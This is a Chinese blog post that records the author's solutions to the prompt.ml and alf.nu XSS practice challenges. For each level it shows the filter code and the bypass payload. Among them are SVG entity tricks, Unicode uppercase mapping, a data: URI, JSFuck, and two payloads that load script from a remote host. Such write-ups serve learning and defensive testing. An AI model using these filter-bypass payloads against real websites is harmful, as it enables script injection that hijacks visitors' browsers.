---
title: xss练习记录
date: 2018-08-19 12:44:46
tags:
	- xss
	- 练习记录
---

# 前言

由于各种原因吧，之前也没好好学过xss，就知道简单的闭合弹个窗什么的，趁暑假有时候，系统的学习一下xss。毕竟xss也是web安全的一个重头戏。而且看完一叶飘零师傅的文章，感觉xss比我之前想象的要强的多，也可以达到很强的破坏力。

就先和刷sqllibs一样吧，做一些题目练手。

# prompt.ml

## level 0

比较简单了，没做什么过滤和防护，闭合双引号就能逃逸出来了

![](xss练习记录\1.png)



## level 1

做了一些过滤，不允许输入`<xxx>`、`</xxx>`形式的标签

```javascript
function escape(input) {
    var stripTagsRE = /<\/?[^>]+>/gi;
    input = input.replace(stripTagsRE, '');
    return '<article>' + input + '</article>';
} 
```

然后我利用了下浏览器的容错性，增添了一个`<img src=x onerror="alert(/xss/)"`的未闭合标签，也有可能是后面的`</article>`中的`>`对其进行了闭合，总之达到了一个xss的效果

![](xss练习记录\2.png)

## level 2

果然很菜了，到第三道题就卡住了。过滤了`=`、`(`

```javascript
function escape(input) {
    input = input.replace(/[=(]/g, '');
    return input;
}     
```

一开始想利用`src`或者一些html编码发现貌似不行，于是无奈的看了下writeup。payload为

```html
<svg><script>&#97;&#108;&#101;&#114;&#116;&#40;&#47;&#120;&#115;&#115;&#47;&#41;</script>
```

于是有点好奇，为什么自己的实体编码不行，而它的又可以，而且把`<svg>`标签替换成别的又无法执行

找了个篇很详细的文章http://pupiles.com/xss.html 我就不班门弄斧了。

由于`<svg>`属于一种外部标签，对内部实体支持xml解析，于是就将html编码给解码成原来的样子了。从而产生xss

![](xss练习记录\3.png)



## level 3

好吧，还是无奈的看了writeup，算是一个小trick把，html5中可以利用`--!>`来闭合标签

payload

```html
--!><script>alert(/xss/)</script>
```

![](xss练习记录\5.png)



## level 4

好吧还是不会

```javascript
function escape(input) {
    if (/^(?:https?:)?\/\/prompt\.ml\//i.test(decodeURIComponent(input))) {
        var script = document.createElement('script');
        script.src = input;
        return script.outerHTML;
    } else {
        return 'Invalid resource.';
    }
}     
```

题目中利用正则匹配，规定字符串起始只能为`http://prompt.ml/`

这里的一个小trick就是，url的另外一种形式`http://username:password@host/`

利用这个方式就可以将前面的`prompt.ml`转换成用户名的格式，`/`利用`%2f`解码绕过从而加载自己网站上的js

payload:

```
http://prompt.ml%2f@blog.kingkk.com/kingkktest/1.js
```

![](xss练习记录\6.png)

有个问题，就是edge和chrome似乎已经不支持这种`http://username:password@host/`格式的url

请求会被阻塞掉

![](xss练习记录\7.png)

目前就只有在火狐浏览器上能成功，算是一个小trick吧

## level 5

```javascript
function escape(input) {
    input = input.replace(/>|on.+?=|focus/gi, '_');
    return '<input value="' + input + '" type="text">';
}     
```

过滤了`onxxx`以及`focus`之类的事件，也将`>`过滤，导致无法闭合标签

这里有两个小点

- 浏览器默认解析第一个type属性
- 浏览的兼容性导致允许一些换行符的存在

这样，我们就可以将这个`input`标签的属性变成`image`，然后利用

```
error
="prompt(1)
```

进行绕过，js中正则的`g`模式匹配空白符，但是不匹配换行符

于是payload为

```html
" type="image"  src=1 onerror 
="prompt(1)
```

![](xss练习记录\8.png)

==、原来prompt(1)函数是用来通关用的，前面一直用的`alert(/xss/)`

## level 6

emmm这题琢磨了蛮久的，一开始是由于代码的原因

```javascript
function escape(input) {
    // let's do a post redirection
    try {
        // pass in formURL#formDataJSON
        // e.g. http://httpbin.org/post#{"name":"Matt"}
        var segments = input.split('#');
        var formURL = segments[0];
        var formData = JSON.parse(segments[1]);

        var form = document.createElement('form');
        form.action = formURL;
        form.method = 'post';

        for (var i in formData) {
            var input = form.appendChild(document.createElement('input'));
            input.name = i;
            input.setAttribute('value', formData[i]);
        }

        return form.outerHTML + '                         \n\
<script>                                                  \n\
    // forbid javascript: or vbscript: and data: stuff    \n\
    if (!/script:|data:/i.test(document.forms[0].action)) \n\
        document.forms[0].submit();                       \n\
    else                                                  \n\
        document.write("Action forbidden.")               \n\
</script>                                                 \n\
        ';
    } catch (e) {
        return 'Invalid form data.';
    }
}     
```

输入demo的url之后会生成一段这样的html文本

```html
<form action="http://httpbin.org/post" method="post"><input name="name" value="Matt"></form>       
<script>                                                  
    // forbid javascript: or vbscript: and data: stuff    
    if (!/script:|data:/i.test(document.forms[0].action)) 
        document.forms[0].submit();                       
    else                                                  
        document.write("Action forbidden.")               
</script> 
```

主要的问题实在生成的html中，相当于我们可以控制html的form的`action`、input的`name`以及`value`



首先假如在action中嵌入`javascript:alert(/xss/)`然后进行提交的时候，是会产生弹窗的

![](xss练习记录\9.png)

但是当我们这里将action的值设为`javascript:alert(/xss/)`时，会被forbidden掉

```javascript
if (!/script:|data:/i.test(document.forms[0].action)) 
    // alert(/xx/);
    document.forms[0].submit();                       
else                                                  
    document.write("Action forbidden.");  
```



这里还有一个trick就是`form.action`是会优先匹配`name=action`的节点，匹配不到时，然后再去寻找`action`属性的值

![](xss练习记录\10.png)

删除这个`name=action`的节点时，就能匹配到form的`action`值了

![](xss练习记录\11.png)

这样，这题的答案也就差不多出来了

```
javascript:prompt(1)#{"action":"Matt"}
```

![](xss练习记录\12.png)



## level 7

主要是利用js的注释，注释掉多余的html字符串，这个在括号里面的注释我是真的没想到。

但也比较容易想通，就直接上payload好了

```html
"><script>/*#*/prompt(1/*);#"*/);/*#*/</script>
```

![](xss练习记录\13.png)



## level 8

比较头疼的一题，搜了writeup，说是可以利用`\u2028`、`\u2029`来替代换行符

- 是U+2028，是Unicode中的行分隔符。
- 是U+2029，是Unicode中的段落分隔符。

由于根本手打不出这两个字，所以我选择了在本地上测试一下。发现了一些奇怪的东西

代码是这样的

```html
<body>
</body>
<script>                                    
	
	function escape(input) {
		input = input.replace(/[\r\n</"]/g, '');
		return input;

	}
	var s = '\u2028alert(/xss/);\u2029-->';
	var scr = document.createElement('script');
	scr.innerText='// console.log("'+s+'");';
	document.body.appendChild(scr);

</script>

```

这里确实可以利用`\u2028`或者`\u2029`当作换行符

![](xss练习记录\14.png)

但是当我为变量`s`加上`escape`函数的时候，就不能弹窗了，虽然显示的格式依旧一样

应该是`\n\r`替换了其中的一部分东西吧，

总之，两个trick，

- `\u2028` `\u2029`可以当作换行符使用
- `-->`在js中可以当作注释符(单行注释)

这题就暂且到这

## level 9

一个比较关键的点`toUpperCase()`，它会将字符串转成大写的，作为防御的手段之一

然而问题也就出在这里

> The special part here is the transformation behavior. Not all Unicode characters have matching representations when casted to capitals - so browsers often tend to simply take a look-alike, best-fit mapping ASCII character instead. There’s a fairly large range of characters with this behavior and all browsers do it a bit differently.

并非所有的字符串都有大写，有时候浏览器会将他们转换成相似的形式，而且每个浏览器行为不同

例如chrome中会将`ſ`大写转化后变成`S`从而绕过正则，产生`SCRIPT`标签

于是就可以构造`<ſcript src=//kingkk.com/2.js></ſcript>`，在chorme中会被转换成

```
<SCRIPT SRC=//KINGKK.COM/2.JS></SCRIPT>
```

http和域名是大小写不敏感的，linux是大小写敏感的，我们只要在自己的服务器下放置`2.JS`文件即可

![](xss练习记录\15.png)

## level 10

感觉比较简单了，进行了两次过滤，只要在prompt中插入一个单引号就可以了

```
pro'mpt(1)
```

![](D:\Code\kingkaki.github.io\source\_posts\xss练习记录\16.png)



## level 11

过滤了很多字符串，导致暂时无法改变语句。

看了writeup之后是说用`in`运算符，则会执行前面的语句

![](D:\Code\kingkaki.github.io\source\_posts\xss练习记录\17.png)

可以看到虽然报了错，但是还是执行了`alert`语句，利用这个方法就可以构造payload

```
"(prompt(1))in"
```

![](D:\Code\kingkaki.github.io\source\_posts\xss练习记录\18.png)



## level 12

本来一开始想用`eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 47, 120, 115, 115, 47, 41))`

后来发现url编码之后`,`不能使用了，于此同时，很多`=`,`:`之类的也不能用了

看了解法之后是用`parseInt`他能得到一个字符串的十进制表示，利用`toString`即可还原成字符

> parseInt() 函数可解析一个字符串，并返回一个整数。

得到`parseInt("prompt",36)`转换后的数字是`1558153217`

于是最终的payload就是

```
eval(1558153217.toString(36)(1))
```

![](xss练习记录\19.png)



## level 13

好吧，我也不知道是我看不懂还是不想看，总之看了一会逻辑不是很明白，就想着翻writeup了，就当学习一下trick了

第一个trick就是当实例中没有该属性的时候，js会去类的`__proto__`中寻找该值，并返回

```
> config = { "source":"http:www.kingkk.com","__proto__":{"source":"http://evil.com"} }
< {source: "http:www.kingkk.com"}

> config.source
< "http:www.kingkk.com"

> delete config.source
< true

> config.source
<"http://evil.com"
```



还有一个trick是正则匹配的trick，关于$\`的

```
> 'abcdef'.replace('cd','$`123')
< "abab123ef"
```

当要替换的值中有$\`的值时，会是上面这种匹配情况

最后的payload

```
{"source":{},"__proto__":{"source":"$`onerror=prompt(1)>"}}
```

终极复杂了，可以说没怎么看懂

![](xss练习记录\20.png)



## level 14

好吧，其实一开始想到了尝试`base64`的形式，但是base64是大小写敏感，这里的`toUpperCase()`让我不知道怎么处理

看了writeup，构造出了一个base64全为大写的payload

```
"><IFRAME/SRC="x:text/html;base64,ICA8U0NSSVBUIC8KU1JDCSA9SFRUUFM6UE1UMS5NTD4JPC9TQ1JJUFQJPD4=
```

由于无法将url指定到我的服务器，所以暂时也无法复现



## level15

level7的升级版本，最主要的就是过滤了`*`，于是就不能用`/*`、`*/`的方式来过滤

这里主要是利用`<svg>`这种外部元素，会对其中的字符进行xml解析，也就导致了`<!--`、`-->`这种过滤符可以被使用

然后利用这个特性，就可以构造出payload了

```
"><svg><!--#--><script><!--#-->prompt(<!--#-->1)</script>
```

![](xss练习记录\21.png)



# alf.nu

##  warmup

闭合即可

```
");alert(1);// 
```

![](xss练习记录/22.png)

## adobe

转移了`"`,那就另起一个`script`标签

```
)</script><script>alert(1);//
```

![](xss练习记录\23.png)

## json

一样的操作

```
)</script><script>alert(1);//
```

![](D:\Code\kingkaki.github.io\source\_posts\xss练习记录\24.png)

## javascript

好吧，有点菜了，看不到实时生成的html代码就有点蒙蔽

由于之里会将url带入href的部分，会经过一次url解码，导致可以利用url编码的方式绕过

```
%22);alert(1);//
```

![](xss练习记录\25.png)

## markdown

有两个对于markdown语法的正则替换

```js
function escape(s) {
  var text = s.replace(/</g, '&lt;').replace(/"/g, '&quot;');
  // URLs
  text = text.replace(/(http:\/\/\S+)/g, '<a href="$1">$1</a>');
  // [[img123|Description]]
  text = text.replace(/\[\[(\w+)\|(.+?)\]\]/g, '<img alt="$2" src="$1.gif">');
  return text;
}
```

一开始是想到了将两个标签混合在一起，但还是差了点东西

最后看了writeup的payload

```
[[a|http://onerror=alert(1)//]]
```

这样之后，就会生成,从而产生xss

```html
<img alt="<a href="http://onerror=alert(1)//" src="a.gif">">http://onerror=alert(1)//]]</a>
```

![](xss练习记录/26.png)

## dom

输入`TextNode`或者一些`Script`标签时，后面的内容部分都会被转译成html实体，导致无法逃逸

这里的方法是输入一个Comment也就是注释标签，例如

```
Commnet#test
```

就会生成一个

```
<!--test-->
```

这样，我们只要闭合了前面的`<!--`，后面的部分就能自由发挥了

```
Comment#--><script>alert(1)</script>
```



![](xss练习记录\27.png)

## callback

好吧，这题本来不应该没想到的，感觉潜意识里一直想用双引号来闭合，倒是忘了单引号

最后payload

```
'#';alert(1);//
```

![](xss练习记录/28.png)


## skandia

把所有输入转换成了大写的

一开始是想从外部服务器引入js文件的，后来发现好像不支持连外网

于是看了writeup之后发现是利用data协议，进行html编码绕过大写

payload

```
");</script><script  src=data:text/html,%61%6c%65%72%74(1) ></script><script>//
```
![](xss练习记录/29.png)

## tempalte

有点复杂，先空着



## json 2

感觉做这个之前还是有一个逻辑没理清，就是解码顺序

```mermaid
graph LR
A(html解码)-->B(javascript解码)
B-->C(url解码)
```

因此`</script>`标签在`script`标签中有最终的闭合权，无论是在引号还是在别的地方，因为第一次html解码时，是不会解析其中的js代码，只会去识别标签。

从而这里就可以利用双写的方式，来构造`</script>`标签，从而闭合标签，造成xss

payload

```
</s</scriptcript><script>alert(1);//
```

![](xss练习记录/30.png)



## callback 2

虽然是自己写出来的，但是有点蒙的成分，有个小trick

`<!--`在js中也可以当作单行注释来用，然而之前的`-->`只能在行头使用

payload

```
'alert#123';alert(1); <!--
```

![](xss练习记录/31.png)



## skandia 2

无法使用`<`、`>`来闭合标签

一开始想利用`toUpperCase`的特性，找两个转为大写后变成`<`、`>`的unicode字符

最后，想起里啊一个神奇的东西，jsfuck！

于是用jsfuck就可以轻松过关

```
");[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()//
```

![](xss练习记录/32.png)













# Reference Link

http://heartsky.info/2016/07/11/prompt-1-writeup/

http://pupiles.com/xss.html

https://lorexxar.cn/2015/07/02/xss-p/

https://blog.csdn.net/he_and/article/details/79672900

http://heartsky.info/2016/07/13/alert-1-writeup/



